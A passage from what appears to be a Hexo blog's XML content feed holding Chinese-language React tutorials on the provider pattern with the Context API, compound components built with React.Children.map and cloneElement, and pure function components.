class="code"><pre><span class="line">&lt;<span class="title class_">ThemeProvider</span> value=&#123;&#123;<span class="attr">mainColor</span>: <span class="string">&#x27;green&#x27;</span>, <span class="attr">textColor</span>: <span class="string">&#x27;red&#x27;</span>&#125;&#125; &gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Page</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">ThemeProvider</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">ThemeProvider</span> <span class="attr">value</span>=<span class="string">&#123;&#123;mainColor:</span> &#x27;<span class="attr">green</span>&#x27;, <span class="attr">textColor:</span> &#x27;<span class="attr">red</span>&#x27;&#125;&#125; &gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Page</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ThemeProvider</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><br />最后，看到的效果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612606526649-8735e68e-627a-44b9-8312-120deb97b070.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612606526649-8735e68e-627a-44b9-8312-120deb97b070.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当需要改变一个样式主题的时候，改变传给 ThemeProvider 的 value 值就搞定了。</p><p><a name="vRG9H"></a></p><h3 id="（4）React-v16-3-0-之后的提供者模式"><a href="#（4）React-v16-3-0-之后的提供者模式" class="headerlink" title="（4）React v16.3.0 之后的提供者模式"></a>（4）React v16.3.0 之后的提供者模式</h3><p>在 React v16.3.0，新的 Context API 出来了，这套 API 毫不掩饰自己就是“提供者模式”的实现，命名上就带 “Provider” 和 “Consumer”。</p><p>还是上面的样式主题的例子，首先，要用新提供的 <code>createContext</code> 函数创造一个“上下文”对象。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeContext</span> = <span class="title class_">React</span>.<span class="title function_">createContext</span>();</span><br></pre></td></tr></table></figure><p><br />这个“上下文”对象 <code>ThemeContext</code> 有两个属性，分别就是 <code>Provider</code> 和 <code>Consumer</code>。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeProvider</span> = <span class="title class_">ThemeContext</span>.<span class="property">Provider</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ThemeConsumer</span> = <span class="title class_">ThemeContext</span>.<span class="property">Consumer</span>;</span><br></pre></td></tr></table></figure><p><br />创造“提供者”极大简化了，都不需要创造一个 React 组件类。使用“消费者”也同样简单，而且应用了 render props 模式，<code>Subject</code> 的代码如下:</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Subject</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeConsumer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;</span></span><br><span class="line"><span class="language-xml">          (theme) =&gt; (</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> <span class="attr">theme.mainColor</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">              &#123;this.props.children&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          )</span></span><br><span class="line"><span class="language-xml">        &#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ThemeConsumer</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />上面的 <code>ThemeConsumer</code> 其实就是一个应用了 render props 模式的组件，它要求子组件是一个函数，会把“上下文”的数据作为参数传递给这个函数，而这个函数里就可以通过参数访问“上下文”对象。</p><p>在新的 API 里，不需要设定组件的 <code>childContextTypes</code> 或者 <code>contextTypes</code> 属性，这省了不少事。可以注意到，<code>Subject</code> 没有自己的状态，没必要实现为类，我们用纯函数的形式实现 <code>Paragraph</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Paragraph</span> = (<span class="params">props, context</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ThemeConsumer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;</span></span><br><span class="line"><span class="language-xml">        (theme) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> <span class="attr">theme.textColor</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          )</span></span><br><span class="line"><span class="language-xml">      &#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ThemeConsumer</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />实现 <code>Page</code> 的方式并没有变化，而应用 <code>ThemeProvider</code> 的代码和之前也完全一样:</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ThemeProvider</span> value=&#123;&#123;<span class="attr">mainColor</span>: <span class="string">&#x27;green&#x27;</span>, <span class="attr">textColor</span>: <span class="string">&#x27;red&#x27;</span>&#125;&#125; &gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Page</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">ThemeProvider</span>&gt;</span><br></pre></td></tr></table></figure><p><a name="nqVXY"></a></p><h3 id="（5）两种提供者模式实现方式的比较"><a href="#（5）两种提供者模式实现方式的比较" class="headerlink" title="（5）两种提供者模式实现方式的比较"></a>（5）两种提供者模式实现方式的比较</h3><p>通过上面的代码，可以很清楚地看到，新的 Context API 更简洁，但也并不是十全十美。</p><p>在老版 Context API 中，“上下文”只是一个概念，并不对应一个代码，两个组件之间达成一个协议，就诞生了“上下文”。在新版 Context API 中，需要一个“上下文”对象（上面的例子中就是 <code>ThemeContext</code>)，使用“提供者”的代码和“消费者”的代码往往分布在不同的代码文件中，这个 <code>ThemeContext</code> 对象放在一个独立的文件中，这么一来，就多出一个代码文件，而且所有和这个“上下文”相关的代码，都要依赖于这个“上下文”代码文件，虽然这没什么大不了的，但是的确多了一层依赖关系。</p><p>为了避免依赖关系复杂，每个应用都不要滥用“上下文”，应该限制“上下文”的使用个数。</p><p><a name="UHzJX"></a></p><h2 id="5-组合组件"><a href="#5-组合组件" class="headerlink" title="5. 组合组件"></a>5. 组合组件</h2><p>所谓模式，就是特定于一种问题场景的解决办法：<strong>模式(Pattern) &#x3D; 问题场景(Context) + 解决办法(Solution)</strong></p><p>组合组件模式要解决的是这样一类问题：父组件想要传递一些信息给子组件，但是，如果用 props 传递又显得十分麻烦。看到这个问题描述，可能想到 Context API，利用 Context，可以让组件之间不用 props 来传递信息。不过，使用 Context 也不是完美解法，使用新的 Context API，需要让“提供者”和“消费者”共同依赖于一个 Context 对象，而且消费者也要使用 render props 模式。如果不嫌麻烦，用 Context 来解决问题当然好，但是肯定会想有没有更简洁的方式， 那就是利用组合组件。</p><p><a name="ral0M"></a></p><h3 id="（1）示例"><a href="#（1）示例" class="headerlink" title="（1）示例"></a>（1）示例</h3><p>很多界面都有 Tab 这样的元件，我们需要一个 <code>Tabs</code> 组件和 <code>TabItem</code> 组件，<code>Tabs</code> 是容器，<code>TabItem</code> 是一个一个单独的 Tab，一个时刻只有一个 TabItem 被选中，被选中的 TabItem 样式会和其他 TabItem 不同。首先想到的就是，用 Tabs 中一个 state 记录当前被选中的 Tabitem 序号，然后根据这个 state 传递 props 给 TabItem，当然，还要传递一个 <code>onClick</code> 事件进去，捕获点击选择事件。</p><p>按照这样的设计，Tabs 中如果要显示 <code>One</code>、<code>Two</code>、<code>Three</code> 三个 TabItem，JSX 代码大致这么写：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">TabItem</span> active=&#123;<span class="literal">true</span>&#125; onClick=&#123;<span class="variable language_">this</span>.<span class="property">onClick</span>&#125;&gt;<span class="title class_">One</span>&lt;/<span class="title class_">TabItem</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span> <span class="attr">active</span>=<span class="string">&#123;false&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onClick&#125;</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span> <span class="attr">active</span>=<span class="string">&#123;false&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onClick&#125;</span>&gt;</span>Three<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span> <span class="attr">active</span>=<span class="string">&#123;true&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onClick&#125;</span>&gt;</span>One<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span> <span class="attr">active</span>=<span class="string">&#123;false&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onClick&#125;</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span> <span class="attr">active</span>=<span class="string">&#123;false&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onClick&#125;</span>&gt;</span>Three<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><br />上面的 <code>TabItem</code> 组件接受 <code>active</code> 这个 props，如果 true 代表当前是选中状态，当然可以工作，但是也存在问题：<br />● 每次使用 TabItem 都要传递一堆 props，好麻烦；<br />● 每增加一个新的 TabItem，都要增加对应的 props，更麻烦；<br />● 如果要增加 TabItem，就要去修改 Tabs 的 JSX 代码，超麻烦。</p><p>在理想情况下，我们希望随意增加减少 <code>TabItem</code> 实例，不用传递一堆 props，也不用去修改 Tabs 的代码，最好代码就这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Tabs</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>One<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>Three<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Tabs</span>&gt;</span><br></pre></td></tr></table></figure><p><br />这样，<code>Tabs</code> 和 <code>TabItem</code> 不通过表面的 props 传递也能心有灵犀，二者之间有某种神秘的“组合”，就是“组合组件”。</p><p>在这里，用一种更巧妙的方式来实现组合组件，可以避免 TabItem 的复杂化。先写出 TabItem 的代码，如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">TabItem</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;active, onClick&#125; = props;</span><br><span class="line">  <span class="keyword">const</span> tabStyle = &#123;</span><br><span class="line">    <span class="string">&#x27;max-width&#x27;</span>: <span class="string">&#x27;150px&#x27;</span>,</span><br><span class="line">    <span class="attr">color</span>: active ? <span class="string">&#x27;red&#x27;</span> : <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="attr">border</span>: active ? <span class="string">&#x27;1px red solid&#x27;</span> : <span class="string">&#x27;0px&#x27;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;tabStyle&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;onClick&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br /><code>TabItem</code> 有两个重要的 props：<code>active</code> 代表自己是否被激活，<code>onClick</code> 是自己被点击时应该调用的回调函数，这就足够了。TabItem 所做的就是根据这两个 props 渲染出 <code>props.children</code>，没有任何复杂逻辑，是一个无状态组件，用一个纯函数来实现。</p><p>接下来要做的，就看 Tabs 如何把 <code>active</code> 和 <code>onClick </code>传递给 TabItem。来看一下使用组合组件的 JSX 代码：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Tabs</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>One<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>Two<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">TabItem</span>&gt;</span>Three<span class="tag">&lt;/<span class="name">TabItem</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Tabs</span>&gt;</span><br></pre></td></tr></table></figure><p><br />Tabs 虽然可以访问到作为 props 的 <code>children</code>，但是到手的 <code>children</code> 已经是创造好的元素，而且是不可改变的，Tabs 是不可能把创造好的元素再强塞给 <code>children</code> 的。如果 Tabs 并不去渲染 <code>children</code>，而是把 <code>children</code> 拷贝一份，就有机会去篡改这份拷贝，最后渲染这份拷贝就好了。来看 Tabs 的实现代码：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tabs</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    <span class="attr">activeIndex</span>:  <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> newChildren = <span class="title class_">React</span>.<span class="property">Children</span>.<span class="title function_">map</span>(<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">children</span>, <span class="function">(<span class="params">child, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (child.<span class="property">type</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">React</span>.<span class="title function_">cloneElement</span>(child, &#123;</span><br><span class="line">          <span class="attr">active</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">activeIndex</span> === index,</span><br><span class="line">          <span class="attr">onClick</span>: <span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">activeIndex</span>: index&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> child;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;newChildren&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 render 函数中用到了 React 中不常用的两个 API：<br />● <code>React.Children.map</code>：遍历 <code>children</code> 中所有的元素，因为 <code>children</code> 可能是一个数组。<br />● <code>React.cloneElement</code>：复制某个元素。这个函数第一个参数就是被复制的元素，第二个参数可以增加新产生元素的 props，利用这个机会把 <code>active</code> 和 <code>onClick</code> 添加了进去。</p><p>这两个 API 双剑合璧，就能实现不通过表面的 props 传递，完成两个组件的“组合”。最终的效果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612607366110-6ad49d50-789c-49a9-bba9-3434e7697946.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612607366110-6ad49d50-789c-49a9-bba9-3434e7697946.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>点击任何一个 <code>TabItem</code>，其样式就会立刻改变。而维护哪个 <code>TabItem</code> 是当前选中的状态，则是 Tabs 的责任。<br><a name="ERgrG"></a></p><h3 id="（2）实际应用"><a href="#（2）实际应用" class="headerlink" title="（2）实际应用"></a>（2）实际应用</h3><p>从上面的代码可以看出，对于组合组件这种实现方式，<code>TabItem</code> 非常简化；<code>Tabs</code> 稍微麻烦了一点，但是好处就是把复杂度都封装起来了，从使用者角度，连 props 都看不见。</p><p>所以，应用组合组件的往往是共享组件库，把一些常用的功能封装在组件里，让应用层直接用就行。在 antd 和 bootstrap 这样的共享库中，都使用了组合组件这种模式。</p><p>如果某两个组件并不需要重用，那么就要谨慎使用组合组件模式，毕竟这让代码复杂了一些</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 纯函数组件</title>
      <link href="/2023/07/27/frontend/react/react-chun-han-shu-zu-jian/"/>
      <url>/2023/07/27/frontend/react/react-chun-han-shu-zu-jian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="YdgqM"></a></p><h2 id="1-纯函数"><a href="#1-纯函数" class="headerlink" title="1. 纯函数"></a>1. 纯函数</h2><p>所谓纯函数，它是这样一种函数：<strong>即相同的输入，永远会得到相同的输出，而且没有任何可观察的副作用</strong>。</p><p>从纯函数的定义，可以提取出纯函数的必要条件：<br />● 纯函数接受参数，基于参数计算，返回一个新对象；<br />● 不会产生副作用，计算过程不会修改输入的参数并且不修改其作用域之外的参数或方法；<br />● 相同的输入保证相同的输出。</p><p>先来看个例子，做下对比：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> friend = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&#x27;san&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 非纯函数：会修改函数外变量 friend 的值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">appendMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    friend.<span class="property">message</span> = &#123;</span><br><span class="line">        <span class="attr">time</span>: <span class="string">&#x27;2021年&#x27;</span>,</span><br><span class="line">        <span class="attr">info</span>: <span class="string">&#x27;学习React&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 纯函数：返回一个新对象，且不会修改参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">appendMessage</span>(<span class="params">friend</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> copyFriend = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, friend)</span><br><span class="line">    copyFriend.<span class="property">message</span> = &#123;</span><br><span class="line">        <span class="attr">time</span>: <span class="string">&#x27;2021年&#x27;</span>,</span><br><span class="line">        <span class="attr">info</span>: <span class="string">&#x27;学习React&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> copyFriend</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />通过上面的代码，可以总结出纯函数的优点：<br />● 相同的输入必定是相同的输出，所以纯函数可以根据输入来做<strong>缓存</strong>；<br />● 相同的输入必定是相同的输出，这就保证了引用的透明性；<br />● 纯函数完全自给自足，这点的好处就是纯函数的依赖很明确，因此更易于观察和理解，而且让我们的测试更加容易；<br />● 可靠：不用担心有副作用，可以更好的工作；<br />● 代码并行：可以并行运行任意纯函数，因为纯函数不需要访问共享的内存，而且也<strong>不会因为副作用而进入竞争态</strong>。</p><p>所以，建议使用纯函数来编写函数。执行一个纯函数不需要担心它会干什么坏事，它不会产生不可预料的行为，也不会对外部产生影响。不论什么时候，相同的输入必定是产出相同的输出，而且使用纯函数方便我们调试和测试。<br><a name="wkwyq"></a></p><h2 id="2-纯函数组件"><a href="#2-纯函数组件" class="headerlink" title="2. 纯函数组件"></a>2. 纯函数组件</h2><p>如果一个组件没有状态（<code>state</code>），那么组件的输出方式，将完全取决于两个参数：<code>props</code> 和 <code>context</code>，只要有相同的 <code>props</code> 和 <code>context</code> ，那么他们的输出绝对是相同的。将组件比喻成函数的话，相同的输入(<code>props</code> 和 <code>context</code>) 永远都会有相同的输出：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">sayHi</span> ? <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> : <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Byebye<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面代码所示，<code>props</code> 是输入，只要输入相同，那么输出也一定相同。</p><p>使用纯函数创建组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Title</span> (props) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123; props.title &#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Title</span> = (<span class="params">&#123; props &#125;</span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123; props.title &#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>对比下使用类组件方式创建的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es6 类组件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Title</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;this.props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对比，纯函数组件写法简单了，可以看出<strong>纯函数组件的特点</strong>:<br />● 组件不会被实例化，整体渲染性能得到提升；<br />● 组件不能访问 <code>this</code> 对象；<br />● 组件无法访问生命周期的方法；<br />● 无状态组件只能访问输入的 <code>props</code>，<strong>无副作用</strong>。</p><p>可以总结出<strong>纯函数组件的优点</strong>：<br />● 无副作用；<br />● 占内存更小，首次 <code>render</code> 的性能更好；<br />● 语法更简洁，可读性好，逻辑简单，测试简单，代码量少，容易复用；<br />● 更佳的性能表现：因为函数组件中不需要进行生命周期的管理和状态管理，因此 React 并不需要进行某些特定的检查和内存分配，保证了性能。</p><p>当然，纯函数组件也有自己的短板，它无生命周期，且没有 <code>this</code>。</p><p><a name="UyEVz"></a></p><h2 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3. 使用场景"></a>3. 使用场景</h2><p>纯函数组件被鼓励在大型项目中尽可能以简单的写法来分割原本庞大的组件，未来 React 也会像面向无状态组件一样在譬如无意义的检查和内存分配领域进行一系列优化，所以只要有可能，尽量使用无状态组件。</p><p>纯函数不会产生不可预料的行为，建议合理的选择纯函数的方式书写函数。同样，在 React 组件中，如果无需本地 <code>state</code> 去缓存一些数据，也不需要用到生命周期函数，那么就可以把当前组件定义为纯函数组件，可读性好，且性能表现更佳。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
